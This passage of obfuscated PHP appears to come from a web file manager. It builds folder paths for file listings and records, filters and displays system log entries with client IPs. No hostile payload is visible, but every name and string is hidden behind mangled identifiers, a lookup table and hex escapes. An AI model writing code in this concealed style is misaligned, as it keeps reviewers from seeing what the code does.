$this->parentLevelArray($¸–Š“¯[$ñİ¿öõ‰[520]]); $ìÕÌ·†º = $ñİ¿öõ‰[12]; foreach ($ôºì“¥° as $•Ë½Ê¿µ) { $Ëê­Îõ = Model($ñİ¿öõ‰[521])->getInfo($•Ë½Ê¿µ); $ìÕÌ·†º .= $Ëê­Îõ[$ñİ¿öõ‰[87]][$ñİ¿öõ‰[411]] . $ñİ¿öõ‰[50]; } $šĞò´ï÷[$ñİ¿öõ‰[522]] = $¸–Š“¯[$ñİ¿öõ‰[441]]; $šĞò´ï÷[$ñİ¿öõ‰[523]] = $¸–Š“¯[$ñİ¿öõ‰[520]]; $šĞò´ï÷[$ñİ¿öõ‰[524]] = $¸–Š“¯[$ñİ¿öõ‰[525]]; $šĞò´ï÷[$ñİ¿öõ‰[526]] = $ìÕÌ·†º . $¸–Š“¯[$ñİ¿öõ‰[87]][$ñİ¿öõ‰[411]]; } protected function _listAppendPath(&$ÀÇ¬Ìù÷, $îâèØ¼ = false) { $Î€å„­ö =& $_SERVER[Ó¡Ÿ§‚]; static $…¯ïÙÎÚ = array(); $×±çğú = array(); $Ì–Øï’ğ = array(); if ($îâèØ¼) { return $…¯ïÙÎÚ; } foreach ($ÀÇ¬Ìù÷ as &$¦øíòŸ) { $ß´°ğ­ = $¦øíòŸ[$Î€å„­ö[411]]; if ($¦øíòŸ[$Î€å„­ö[419]] == $Î€å„­ö[88] && $¦øíòŸ[$Î€å„­ö[441]] != 0) { $…¯ïÙÎÚ[$ß´°ğ­] = $¦øíòŸ[$Î€å„­ö[32]]; } if ($¦øíòŸ[$Î€å„­ö[419]] == $Î€å„­ö[88] && $¦øíòŸ[$Î€å„­ö[441]] == 0 && !isset($…¯ïÙÎÚ[$ß´°ğ­])) { $…¯ïÙÎÚ[$ß´°ğ­] = $this->_listAppendPathRoot($¦øíòŸ, array()); } if (isset($Ì–Øï’ğ[$¦øíòŸ[$Î€å„­ö[520]]])) { continue; } $Ì–Øï’ğ[$¦øíòŸ[$Î€å„­ö[520]]] = !0; $ĞÒø¬ùÑ = $this->parentLevelArray($¦øíòŸ[$Î€å„­ö[520]]); foreach ($ĞÒø¬ùÑ as $Š¨€ã½¬ => $ÆÜ–“°) { if (isset($…¯ïÙÎÚ[$ÆÜ–“°])) { continue; } if ($Š¨€ã½¬ == 0) { $…¯ïÙÎÚ[$ÆÜ–“°] = $this->_listAppendPathRoot($¦øíòŸ, $ĞÒø¬ùÑ); } if ($Š¨€ã½¬ != 0) { $×±çğú[] = $ÆÜ–“°; } } } unset($¦øíòŸ); $×±çğú = array_unique($×±çğú); if (count($×±çğú) > 0) { $ü¥§óĞ± = array($Î€å„­ö[426] => array($Î€å„­ö[427], $×±çğú)); if (count($×±çğú) == 1) { $Úãœ‰şÎ = $this->sourceInfo($×±çğú[0]); $Å‰‡¾± = is_array($Úãœ‰şÎ) ? array($Úãœ‰şÎ) : !1; } else { $Å‰‡¾± = $this->field($Î€å„­ö[527])->where($ü¥§óĞ±)->select(); } if (!$Å‰‡¾±) { $Å‰‡¾± = array(); } foreach ($Å‰‡¾± as $êí°) { $…¯ïÙÎÚ[$êí°[$Î€å„­ö[411]]] = $êí°[$Î€å„­ö[32]]; } } $ŒÂúË ¸ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¶†úÛ¡® = array(); foreach ($ÀÇ¬Ìù÷ as &$¦øíòŸ) { $¶¬±Áî² = $¦øíòŸ[$Î€å„­ö[520]]; $ˆ‘ù§öÙ = $Î€å„­ö[12]; if (isset($¶†úÛ¡®[$¶¬±Áî²])) { $ˆ‘ù§öÙ = $¶†úÛ¡®[$¶¬±Áî²]; } else { $ĞÒø¬ùÑ = $this->parentLevelArray($¦øíòŸ[$Î€å„­ö[520]]); foreach ($ĞÒø¬ùÑ as $Š¨€ã½¬ => $ÆÜ–“°) { if (isset($…¯ïÙÎÚ[$ÆÜ–“°])) { $ˆ‘ù§öÙ .= $…¯ïÙÎÚ[$ÆÜ–“°] . $Î€å„­ö[8]; } } $¶†úÛ¡®[$¶¬±Áî²] = $ˆ‘ù§öÙ; } $ˆ‘ù§öÙ .= $¦øíòŸ[$Î€å„­ö[32]]; if ($¦øíòŸ[$Î€å„­ö[419]] == $Î€å„­ö[88]) { $ˆ‘ù§öÙ .= $Î€å„­ö[8]; } $¦øíòŸ[$Î€å„­ö[518]] = str_replace($Î€å„­ö[528], $Î€å„­ö[8], $ˆ‘ù§öÙ); if ($¦øíòŸ[$Î€å„­ö[441]] == $Î€å„­ö[198]) { $¦øíòŸ[$Î€å„­ö[32]] = trim($…¯ïÙÎÚ[$¦øíòŸ[$Î€å„­ö[411]]], $Î€å„­ö[8]); $¦øíòŸ[$Î€å„­ö[518]] = $¦øíòŸ[$Î€å„­ö[32]] . $Î€å„­ö[8]; } if (intval($¦øíòŸ[$Î€å„­ö[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¦øíòŸ, $ĞÒø¬ùÑ, $ŒÂúË ¸); } } unset($¦øíòŸ); return $ÀÇ¬Ìù÷; } private function _listAppendPathRecycle(&$¤†»ÌùË, $êØ¸Ë‘Á, $‘¸•‰) { $ï‰ˆîûÙ =& $_SERVER[Ó¡Ÿ§‚]; if (!in_array($‘¸•‰, $êØ¸Ë‘Á) && $¤†»ÌùË[$ï‰ˆîûÙ[411]] != $‘¸•‰) { return; } $ÄÂÂŒÈ¾ = explode($ï‰ˆîûÙ[8], trim($¤†»ÌùË[$ï‰ˆîûÙ[518]], $ï‰ˆîûÙ[8])); $ö‰õ€Çù = implode($ï‰ˆîûÙ[8], array_slice($ÄÂÂŒÈ¾, 2)); $¤†»ÌùË[$ï‰ˆîûÙ[518]] = $ï‰ˆîûÙ[8] . LNG($ï‰ˆîûÙ[529]) . $ï‰ˆîûÙ[8] . ltrim($ö‰õ€Çù, $ï‰ˆîûÙ[8]); $¤†»ÌùË[$ï‰ˆîûÙ[520]] = $ï‰ˆîûÙ[530] . implode($ï‰ˆîûÙ[50], array_slice($êØ¸Ë‘Á, 1)) . $ï‰ˆîûÙ[50]; if ($¤†»ÌùË[$ï‰ˆîûÙ[411]] == $‘¸•‰) { $¤†»ÌùË[$ï‰ˆîûÙ[520]] = $ï‰ˆîûÙ[530]; $¤†»ÌùË[$ï‰ˆîûÙ[441]] = $ï‰ˆîûÙ[198]; $¤†»ÌùË[$ï‰ˆîûÙ[32]] = LNG($ï‰ˆîûÙ[529]); } $¤†»ÌùË[$ï‰ˆîûÙ[531]] = $ï‰ˆîûÙ[532]; } protected function _listAppendPathRoot(&$“ëëøì™, $™Ì¾èË) { $™ùù’ò =& $_SERVER[Ó¡Ÿ§‚]; static $©£’ãé” = false; $ÙœèâŠ¡ = $™ùù’ò[12]; if ($“ëëøì™[$™ùù’ò[420]] == self::TYPE_USER) { if ($“ëëøì™[$™ùù’ò[505]] == USER_ID) { $ÙœèâŠ¡ = LNG($™ùù’ò[533]); if ($©£’ãé” === !1) { $Â©‹Â‚ƒ = Model($™ùù’ò[534])->getInfoFull(USER_ID); $©£’ãé” = _get($Â©‹Â‚ƒ, $™ùù’ò[535], $™ùù’ò[12]); } if ($™Ì¾èË && $™Ì¾èË[0] == $©£’ãé” || !$™Ì¾èË && $“ëëøì™[$™ùù’ò[411]] == $©£’ãé”) { $ÙœèâŠ¡ = LNG($™ùù’ò[536]); $“ëëøì™[$™ùù’ò[537]] = $™ùù’ò[538]; } if (!$™Ì¾èË) { $“ëëøì™[$™ùù’ò[32]] = $ÙœèâŠ¡; } } else { $ ÚÇÃ¹ë = Model($™ùù’ò[513])->getInfoSimple($“ëëøì™[$™ùù’ò[505]]); $ÙœèâŠ¡ = LNG($™ùù’ò[539]) . $™ùù’ò[162] . $ ÚÇÃ¹ë[$™ùù’ò[32]] . $™ùù’ò[164]; $“ëëøì™[$™ùù’ò[540]] = array($™ùù’ò[32] => $ ÚÇÃ¹ë[$™ùù’ò[32]], $™ùù’ò[541] => $ ÚÇÃ¹ë[$™ùù’ò[541]], $™ùù’ò[542] => $ ÚÇÃ¹ë[$™ùù’ò[542]]); } } else { if ($“ëëøì™[$™ùù’ò[420]] == self::TYPE_GROUP) { $ ÚÇÃ¹ë = Model($™ùù’ò[521])->getInfoSimple($“ëëøì™[$™ùù’ò[505]]); $ÙœèâŠ¡ = $ ÚÇÃ¹ë[$™ùù’ò[32]]; } else { if ($“ëëøì™[$™ùù’ò[420]] == self::TYPE_SYSTEM) { $ÙœèâŠ¡ = $™ùù’ò[543]; } } } $ÙœèâŠ¡ = $ÙœèâŠ¡ ? $™ùù’ò[8] . $ÙœèâŠ¡ . $™ùù’ò[8] : $™ùù’ò[8]; return $ÙœèâŠ¡; } protected function _listAppendUser(&$å°©…‡Â) { $µÅÆæ½ =& $_SERVER[Ó¡Ÿ§‚]; $ú’±Ÿ½õ = array_to_keyvalue($å°©…‡Â, $µÅÆæ½[12], $µÅÆæ½[463]); $¬Å´½ = array_to_keyvalue($å°©…‡Â, $µÅÆæ½[12], $µÅÆæ½[465]); $¤¸€ºüÉ = array_merge($ú’±Ÿ½õ, $¬Å´½); $Ó“¨¹¾ö = Model($µÅÆæ½[534])->userListInfo($¤¸€ºüÉ); foreach ($å°©…‡Â as &$äÍË—‘) { $›¹ëèÈí = $äÍË—‘[$µÅÆæ½[463]]; $äÍË—‘[$µÅÆæ½[463]] = $Ó“¨¹¾ö[$›¹ëèÈí] ? $Ó“¨¹¾ö[$›¹ëèÈí] : !1; $›¹ëèÈí = $äÍË—‘[$µÅÆæ½[465]]; $äÍË—‘[$µÅÆæ½[465]] = $Ó“¨¹¾ö[$›¹ëèÈí] ? $Ó“¨¹¾ö[$›¹ëèÈí] : !1; if (isset($äÍË—‘[$µÅÆæ½[475]]) && $äÍË—‘[$µÅÆæ½[475]][$µÅÆæ½[544]]) { $œï³Éè = $GLOBALS[$µÅÆæ½[6]][$µÅÆæ½[89]][$µÅÆæ½[545]]; if ($äÍË—‘[$µÅÆæ½[475]][$µÅÆæ½[546]] <= time() - $œï³Éè) { $this->metaSet($äÍË—‘[$µÅÆæ½[411]], $µÅÆæ½[544], null); $this->metaSet($äÍË—‘[$µÅÆæ½[411]], $µÅÆæ½[546], null); unset($äÍË—‘[$µÅÆæ½[475]][$µÅÆæ½[544]]); continue; } $ªñüò§ª = $äÍË—‘[$µÅÆæ½[475]][$µÅÆæ½[544]]; $äÍË—‘[$µÅÆæ½[475]][$µÅÆæ½[547]] = Model($µÅÆæ½[534])->getInfoSimpleOuter($ªñüò§ª); } } unset($äÍË—‘); } public function parentLevelArray($á­ÚŞ’í) { $§…ô…¾ =& $_SERVER[Ó¡Ÿ§‚]; $á­ÚŞ’í = explode($§…ô…¾[50], trim($á­ÚŞ’í, $§…ô…¾[50])); return array_remove_value($á­ÚŞ’í, $§…ô…¾[198]); } public function listAll($ı¨Ù¿Êö) { $¯„ø¡ó§ =& $_SERVER[Ó¡Ÿ§‚]; $š›ß’Ó = $this->sourceInfo($ı¨Ù¿Êö); $ŸŠ½¥ƒ† = array($¯„ø¡ó§[548] => array($¯„ø¡ó§[549], $š›ß’Ó[$¯„ø¡ó§[520]] . $ı¨Ù¿Êö . $¯„ø¡ó§[550]), $¯„ø¡ó§[551] => 0); $ôÅığŒÊ = $¯„ø¡ó§[552]; $íÑç„ä… = "\x4c\105\x46\x54\40\112\117\111\116\40{$this->tablePrefix}\151\x6f\137\146\151\x6c\x65\40\x66\x69\154\145\40\157\156\x20\163\x6f\165\x72\143\145\56\146\x69\x6c\x65\111\x44\40\75\x20\146\x69\154\145\56\x66\151\x6c\x65\x49\104"; $Š‚ÊÖùÚ = $this->alias($¯„ø¡ó§[455])->field($ôÅığŒÊ)->where($ŸŠ½¥ƒ†)->join($íÑç„ä…)->select(); $this->_listAppendAuth($Š‚ÊÖùÚ); $this->_listAppendUser($Š‚ÊÖùÚ); $this->_listAppendPath($Š‚ÊÖùÚ); $Š‚ÊÖùÚ = array_to_keyvalue($Š‚ÊÖùÚ, $¯„ø¡ó§[411]); $Ò¯¤±Ûı = "\57{$š›ß’Ó[$¯„ø¡ó§[32]]}\x2f"; $Ò¯¤±Ûı = $Ò¯¤±Ûı == $¯„ø¡ó§[528] ? $¯„ø¡ó§[8] : $Ò¯¤±Ûı; $¸çÈ¼şü = array(); foreach ($Š‚ÊÖùÚ as $“Ê—ş   => $êü„î”¼) { $ÂÖÖáª› = $this->parentLevelArray($êü„î”¼[$¯„ø¡ó§[520]]); array_shift($ÂÖÖáª›); $šÜÉÚ÷ = $Ò¯¤±Ûı; for ($’ƒõ ²¼ = 0; $’ƒõ ²¼ < count($ÂÖÖáª›); $’ƒõ ²¼++) { $šÜÉÚ÷ .= $Š‚ÊÖùÚ[$ÂÖÖáª›[$’ƒõ ²¼]][$¯„ø¡ó§[32]] . $¯„ø¡ó§[8]; } $šÜÉÚ÷ .= $êü„î”¼[$¯„ø¡ó§[32]]; if ($êü„î”¼[$¯„ø¡ó§[419]]) { $šÜÉÚ÷ .= $¯„ø¡ó§[8]; } $²»Ú‡“ = array($¯„ø¡ó§[430] => str_replace($¯„ø¡ó§[528], $¯„ø¡ó§[8], str_replace($¯„ø¡ó§[528], $¯„ø¡ó§[8], str_replace($¯„ø¡ó§[528], $¯„ø¡ó§[8], $šÜÉÚ÷))), $¯„ø¡ó§[553] => intval($êü„î”¼[$¯„ø¡ó§[419]]), $¯„ø¡ó§[554] => intval($êü„î”¼[$¯„ø¡ó§[76]]), $¯„ø¡ó§[85] => intval($êü„î”¼[$¯„ø¡ó§[85]]), $¯„ø¡ó§[87] => $this->pathInfoFilter($êü„î”¼)); if (!$²»Ú‡“[$¯„ø¡ó§[419]]) { $²»Ú‡“[$¯„ø¡ó§[477]] = $êü„î”¼[$¯„ø¡ó§[477]]; } $¸çÈ¼şü[] = $²»Ú‡“; } $¸çÈ¼şü = array_sort_by($¸çÈ¼şü, $¯„ø¡ó§[84]); return $¸çÈ¼şü; } } goto BÔ­°Ã†º; e©§İŒÛÉ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\137\x6c\157\147"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\145\162\164", "\x66\x75\156\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ã‹ÄĞ =& $_SERVER[Ó¡Ÿ§‚]; return array($Ã‹ÄĞ[2186] => LNG($Ã‹ÄĞ[2187]), $Ã‹ÄĞ[2188] => LNG($Ã‹ÄĞ[2189]), $Ã‹ÄĞ[1797] => LNG($Ã‹ÄĞ[2190]), $Ã‹ÄĞ[2191] => LNG($Ã‹ÄĞ[2192]), $Ã‹ÄĞ[2193] => LNG($Ã‹ÄĞ[2194]), $Ã‹ÄĞ[2195] => LNG($Ã‹ÄĞ[2196]), $Ã‹ÄĞ[2197] => LNG($Ã‹ÄĞ[2198]), $Ã‹ÄĞ[1827] => LNG($Ã‹ÄĞ[2198]), $Ã‹ÄĞ[1828] => LNG($Ã‹ÄĞ[2199]), $Ã‹ÄĞ[2200] => LNG($Ã‹ÄĞ[2201]), $Ã‹ÄĞ[2202] => LNG($Ã‹ÄĞ[2203]), $Ã‹ÄĞ[2204] => LNG($Ã‹ÄĞ[2205]), $Ã‹ÄĞ[2206] => LNG($Ã‹ÄĞ[2207]), $Ã‹ÄĞ[1825] => LNG($Ã‹ÄĞ[2208]), $Ã‹ÄĞ[2209] => LNG($Ã‹ÄĞ[2210]), $Ã‹ÄĞ[1832] => LNG($Ã‹ÄĞ[2211]), $Ã‹ÄĞ[2212] => LNG($Ã‹ÄĞ[2213]), $Ã‹ÄĞ[2214] => LNG($Ã‹ÄĞ[2215]), $Ã‹ÄĞ[2216] => LNG($Ã‹ÄĞ[2217]), $Ã‹ÄĞ[2218] => LNG($Ã‹ÄĞ[2219]), $Ã‹ÄĞ[1835] => LNG($Ã‹ÄĞ[2220]), $Ã‹ÄĞ[1836] => LNG($Ã‹ÄĞ[2221]), $Ã‹ÄĞ[2222] => LNG($Ã‹ÄĞ[2223]), $Ã‹ÄĞ[2224] => LNG($Ã‹ÄĞ[2225]), $Ã‹ÄĞ[2226] => LNG($Ã‹ÄĞ[2227]), $Ã‹ÄĞ[1830] => LNG($Ã‹ÄĞ[2228]), $Ã‹ÄĞ[2229] => LNG($Ã‹ÄĞ[2230]), $Ã‹ÄĞ[1829] => LNG($Ã‹ÄĞ[2231]), $Ã‹ÄĞ[2232] => LNG($Ã‹ÄĞ[2233]), $Ã‹ÄĞ[2234] => LNG($Ã‹ÄĞ[2235]), $Ã‹ÄĞ[2236] => LNG($Ã‹ÄĞ[2237]), $Ã‹ÄĞ[2238] => LNG($Ã‹ÄĞ[2238]), $Ã‹ÄĞ[2239] => LNG($Ã‹ÄĞ[1801]), $Ã‹ÄĞ[2240] => LNG($Ã‹ÄĞ[2241]), $Ã‹ÄĞ[2242] => LNG($Ã‹ÄĞ[2243]), $Ã‹ÄĞ[2244] => LNG($Ã‹ÄĞ[2245]), $Ã‹ÄĞ[2246] => LNG($Ã‹ÄĞ[2247]), $Ã‹ÄĞ[2248] => LNG($Ã‹ÄĞ[2249]), $Ã‹ÄĞ[2250] => LNG($Ã‹ÄĞ[2250]), $Ã‹ÄĞ[2251] => LNG($Ã‹ÄĞ[2252]), $Ã‹ÄĞ[2253] => LNG($Ã‹ÄĞ[2254]), $Ã‹ÄĞ[2255] => LNG($Ã‹ÄĞ[2256]), $Ã‹ÄĞ[2257] => LNG($Ã‹ÄĞ[2258]), $Ã‹ÄĞ[2259] => LNG($Ã‹ÄĞ[2260]), $Ã‹ÄĞ[2261] => LNG($Ã‹ÄĞ[2262])); } private function typeFile() { $½ü”ÛÄŠ =& $_SERVER[Ó¡Ÿ§‚]; $Æ¬²‰î = array($½ü”ÛÄŠ[1832] => array($½ü”ÛÄŠ[1833]), $½ü”ÛÄŠ[2204] => array($½ü”ÛÄŠ[2263]), $½ü”ÛÄŠ[2206] => array($½ü”ÛÄŠ[2264]), $½ü”ÛÄŠ[1825] => array($½ü”ÛÄŠ[1826]), $½ü”ÛÄŠ[2214] => array(), $½ü”ÛÄŠ[2216] => array(), $½ü”ÛÄŠ[2218] => array(), $½ü”ÛÄŠ[1835] => array($½ü”ÛÄŠ[1837]), $½ü”ÛÄŠ[1836] => array($½ü”ÛÄŠ[1837]), $½ü”ÛÄŠ[2222] => array($½ü”ÛÄŠ[2265]), $½ü”ÛÄŠ[2224] => array($½ü”ÛÄŠ[2265]), $½ü”ÛÄŠ[2226] => array($½ü”ÛÄŠ[2266]), $½ü”ÛÄŠ[2212] => array($½ü”ÛÄŠ[2267]), $½ü”ÛÄŠ[1830] => array($½ü”ÛÄŠ[2268]), $½ü”ÛÄŠ[2229] => array($½ü”ÛÄŠ[2269]), $½ü”ÛÄŠ[1829] => array($½ü”ÛÄŠ[1831])); return $Æ¬²‰î; } private function typeAll() { $Óú¿¤îÆ =& $_SERVER[Ó¡Ÿ§‚]; $»ƒœ‰ĞÅ = $this->typeList; $Ù÷¿Øïº = array_filter($this->typeFile()); foreach ($Ù÷¿Øïº as $—ÏÜ¦‚ => $§…½¢‡”) { $»ƒœ‰ĞÅ[$§…½¢‡”[0]] = $»ƒœ‰ĞÅ[$—ÏÜ¦‚]; } $»ƒœ‰ĞÅ[$Óú¿¤îÆ[1837]] = LNG($Óú¿¤îÆ[2270]); $»ƒœ‰ĞÅ[$Óú¿¤îÆ[2265]] = LNG($Óú¿¤îÆ[2271]); return $»ƒœ‰ĞÅ; } public function addLog($ÉÚ°¹ ı, $Š³¹—õº = array()) { $–€¬Ã³Û =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->typeList[$ÉÚ°¹ ı])) { return; } $“Ãí– = USER_ID ? USER_ID : (isset($Š³¹—õº[$–€¬Ã³Û[1665]]) ? $Š³¹—õº[$–€¬Ã³Û[1665]] : 0); if (!$“Ãí–) { $“Ãí– = (int) Session::get($–€¬Ã³Û[1991]); } if ($ÉÚ°¹ ı == $–€¬Ã³Û[2240] && is_array($Š³¹—õº[$–€¬Ã³Û[2272]]) && !$Š³¹—õº[$–€¬Ã³Û[2272]]) { return; } $¦…õÏî = get_client_ip(); if (!$Š³¹—õº || strlen(json_encode($Š³¹—õº)) >= 1024) { $Š³¹—õº = array($–€¬Ã³Û[2273] => $¦…õÏî); } else { if (is_array($Š³¹—õº)) { $Š³¹—õº[$–€¬Ã³Û[2273]] = $¦…õÏî; } else { $Š³¹—õº = array($–€¬Ã³Û[1201] => $Š³¹—õº, $–€¬Ã³Û[2273] => $¦…õÏî); } } $Š³¹—õº = array($–€¬Ã³Û[1655] => Session::sign(), $–€¬Ã³Û[1656] => $“Ãí–, $–€¬Ã³Û[33] => $ÉÚ°¹ ı, $–€¬Ã³Û[1658] => json_encode($Š³¹—õº)); parent::add($Š³¹—õº); } public function remove($Õ¢§Ì»˜) { $this->where(array($_SERVER[Ó¡Ÿ§‚][428] => $Õ¢§Ì»˜))->delete(); } private function _makeOrder($×€ÁÏ†¬ = '') { $´ºà‹ÁÏ =& $_SERVER[Ó¡Ÿ§‚]; $åÚÆ = $´ºà‹ÁÏ[201]; $ÎÃ©¬† = array($´ºà‹ÁÏ[459] => $´ºà‹ÁÏ[460], $´ºà‹ÁÏ[461] => $´ºà‹ÁÏ[462]); $˜š©¾ú¦ = Input::get($´ºà‹ÁÏ[467], $´ºà‹ÁÏ[7], $´ºà‹ÁÏ[2027], array($´ºà‹ÁÏ[1945], $´ºà‹ÁÏ[461])); $˜š©¾ú¦ = $ÎÃ©¬†[$˜š©¾ú¦]; $×€ÁÏ†¬ = $×€ÁÏ†¬ . "{$åÚÆ}\x20{$˜š©¾ú¦}"; return $this->order($×€ÁÏ†¬); } public function get($ Äê‹¹ = '') { $ÑÊŸÊàØ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ Äê‹¹) { show_json(array()); } $ûŸÃ³çô = array(); if ($ Äê‹¹[$ÑÊŸÊàØ[1665]]) { $ûŸÃ³çô[$ÑÊŸÊàØ[1665]] = $ Äê‹¹[$ÑÊŸÊàØ[1665]]; } if (isset($ Äê‹¹[$ÑÊŸÊàØ[759]])) { $­ö„ŠêÏ = $ Äê‹¹[$ÑÊŸÊàØ[759]]; $Õš£Î«é = isset($ Äê‹¹[$ÑÊŸÊàØ[760]]) ? $ Äê‹¹[$ÑÊŸÊàØ[760]] : time(); $ûŸÃ³çô[$ÑÊŸÊàØ[201]] = array($ÑÊŸÊàØ[333], array($­ö„ŠêÏ, $Õš£Î«é)); } if ($ Äê‹¹[$ÑÊŸÊàØ[33]]) { $» ÕÖğŒ = explode($ÑÊŸÊàØ[50], $ Äê‹¹[$ÑÊŸÊàØ[33]]); $âÏÊé = $this->typeFile(); $¬ê¨ÍÁ… = array(); foreach ($» ÕÖğŒ as $ÙßîşÒø) { $¬ê¨ÍÁ…[] = $ÙßîşÒø; if (isset($âÏÊé[$ÙßîşÒø])) { $¬ê¨ÍÁ… = array_merge($¬ê¨ÍÁ…, $âÏÊé[$ÙßîşÒø]); } } $¬ê¨ÍÁ… = array_unique($¬ê¨ÍÁ…); if ($¬ê¨ÍÁ…) { $ûŸÃ³çô[$ÑÊŸÊàØ[33]] = array($ÑÊŸÊàØ[7], $¬ê¨ÍÁ…); } } else { $ûŸÃ³çô[$ÑÊŸÊàØ[33]] = array($ÑÊŸÊàØ[2274], $ÑÊŸÊàØ[2275]); } if (!empty($ Äê‹¹[$ÑÊŸÊàØ[2273]])) { $ûŸÃ³çô[$ÑÊŸÊàØ[462]] = array($ÑÊŸÊàØ[383], "\x25{$ Äê‹¹[$ÑÊŸÊàØ[2273]]}\45"); } $î™‹Çè = $this->_makeOrder()->where($ûŸÃ³çô)->selectPage(); if (empty($î™‹Çè[$ÑÊŸÊàØ[369]])) { show_json(array(), !0, $î™‹Çè[$ÑÊŸÊàØ[366]]); } $î™‹Çè[$ÑÊŸÊàØ[369]] = $this->logList($î™‹Çè[$ÑÊŸÊàØ[369]]); return $î™‹Çè; } private function ipAddress(&$ôëµä­¥) { $’µ×¤÷ =& $_SERVER[Ó¡Ÿ§‚]; if (!empty($ôëµä­¥[$’µ×¤÷[2273]])) { $Æšî¦Çù = IpLocation::get($ôëµä­¥[$’µ×¤÷[2273]]); } else { $Æšî¦Çù = LNG($’µ×¤÷[2276]); } $ôëµä­¥[$’µ×¤÷[2277]] = $Æšî¦Çù; } private function descZipDownload($‹ç³‚Ã, &$ó³œêÁ°) { $ä¤ÓÍ…³ =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($‹ç³‚Ã[$ä¤ÓÍ…³[2278]])) { return; } $‡Ç€ãÇ¨ = json_decode($‹ç³‚Ã[$ä¤ÓÍ…³[2278]], !0); foreach ($‡Ç€ãÇ¨ as $ã¶”) { try { $÷™á®å÷ = IO::infoFull($ã¶”[$ä¤ÓÍ…³[84]]); } catch (Exception $ıúôàş) { continue; } $‹ç³‚Ã[$ä¤ÓÍ…³[84]] = $ã¶”[$ä¤ÓÍ…³[84]]; $ó³œêÁ°[] = $‹ç³‚Ã[$ä¤ÓÍ…³[411]] = $÷™á®å÷[$ä¤ÓÍ…³[411]]; $ó³œêÁ°[] = $‹ç³‚Ã[$ä¤ÓÍ…³[2081]] = $÷™á®å÷[$ä¤ÓÍ…³[441]]; break; } return $‹ç³‚Ã; } private function getSourceList(&$‘ì’ºò) { $¬ÃñÑæ§ =& $_SERVER[Ó¡Ÿ§‚]; $±Å›«ö… = array(); foreach ($‘ì’ºò as $˜úõ¹ùı => $¤æñâá) { $ê°şà–ë = json_decode($¤æñâá[$¬ÃñÑæ§[462]], !0); if ($¤æñâá[$¬ÃñÑæ§[33]] == $¬ÃñÑæ§[1828]) { $ê°şà–ë = $this->descZipDownload($ê°şà–ë, $±Å›«ö…); $‘ì’ºò[$˜úõ¹ùı][$¬ÃñÑæ§[462]] = json_encode($ê°şà–ë); continue; } if (strpos($¤æñâá[$¬ÃñÑæ§[33]], $¬ÃñÑæ§[2083]) !== 0) { if (!isset($ê°şà–ë[$¬ÃñÑæ§[84]]) || strpos($¤æñâá[$¬ÃñÑæ§[33]], $¬ÃñÑæ§[2279]) !== 0) { continue; } try { $¶„Å©½Ø = IO::infoFull($ê°şà–ë[$¬ÃñÑæ§[84]]); } catch (Exception $¢’…“Û) { continue; } $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[411]] = $¶„Å©½Ø[$¬ÃñÑæ§[411]]; $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[2081]] = $¶„Å©½Ø[$¬ÃñÑæ§[441]]; $‘ì’ºò[$˜úõ¹ùı][$¬ÃñÑæ§[462]] = json_encode($ê°şà–ë); continue; } $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[411]]; $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[2081]]; if ($ê°şà–ë[$¬ÃñÑæ§[33]] == $¬ÃñÑæ§[557]) { $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[462]][$¬ÃñÑæ§[1159]]; $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[462]][$¬ÃñÑæ§[1160]]; } if ($ê°şà–ë[$¬ÃñÑæ§[33]] == $¬ÃñÑæ§[2091]) { $±Å›«ö…[] = $ê°şà–ë[$¬ÃñÑæ§[462]][$¬ÃñÑæ§[411]]; } } if (!$±Å›«ö…) { return array(); } return Model($¬ÃñÑæ§[824])->sourceListInfo($±Å›«ö…, !0); } private function logList($¶Ş¬õä) { $ï™Ãî½® =& $_SERVER[Ó¡Ÿ§‚]; $«Ñç±¤å = array_to_keyvalue($¶Ş¬õä, $ï™Ãî½®[12], $ï™Ãî½®[1665]); $Ç©œòú¬ = Model($ï™Ãî½®[534])->userListInfo(array_unique($«Ñç±¤å)); $¤Ÿ„ïÊî = $this->getSourceList($¶Ş¬õä); $„àéƒ¶Ú = $this->typeAll(); $‰¿Ì¦çĞ = array(); $–Œ°ÛØø = array(); foreach ($¶Ş¬õä as $š’¸—Øú => $ò‡¦ÀÂä) { $Ñøìış‹ = $ò‡¦ÀÂä[$ï™Ãî½®[33]]; $Ğàíáİà = isset($Ç©œòú¬[$ò‡¦ÀÂä[$ï™Ãî½®[1665]]]) ? $Ç©œòú¬[$ò‡¦ÀÂä[$ï™Ãî½®[1665]]] : !1; $ÁÕ°ìÈ• = strpos($Ñøìış‹, $ï™Ãî½®[2280]) === 0 ? LNG($ï™Ãî½®[2281]) : LNG($ï™Ãî½®[2276]); $ò‡¦ÀÂä[$ï™Ãî½®[32]] = isset($Ğàíáİà[$ï™Ãî½®[32]]) ? $Ğàíáİà[$ï™Ãî½®[32]] : LNG($ï™Ãî½®[2276]); $ò‡¦ÀÂä[$ï™Ãî½®[541]] = isset($Ğàíáİà[$ï™Ãî½®[541]]) ? $Ğàíáİà[$ï™Ãî½®[541]] : $ï™Ãî½®[12]; $ò‡¦ÀÂä[$ï™Ãî½®[1565]] = isset($„àéƒ¶Ú[$Ñøìış‹]) ? $„àéƒ¶Ú[$Ñøìış‹] : $ÁÕ°ìÈ•; $ò‡¦ÀÂä[$ï™Ãî½®[2026]] = $Ğàíáİà; $£õŒ¼œÁ = json_decode($ò‡¦ÀÂä[$ï™Ãî½®[462]], !0); $ò‡¦ÀÂä[$ï™Ãî½®[2273]] = isset($£õŒ¼œÁ[$ï™Ãî½®[2273]]) ? $£õŒ¼œÁ[$ï™Ãî½®[2273]] : $ï™Ãî½®[12]; $ò‡¦ÀÂä[$ï™Ãî½®[2277]] = 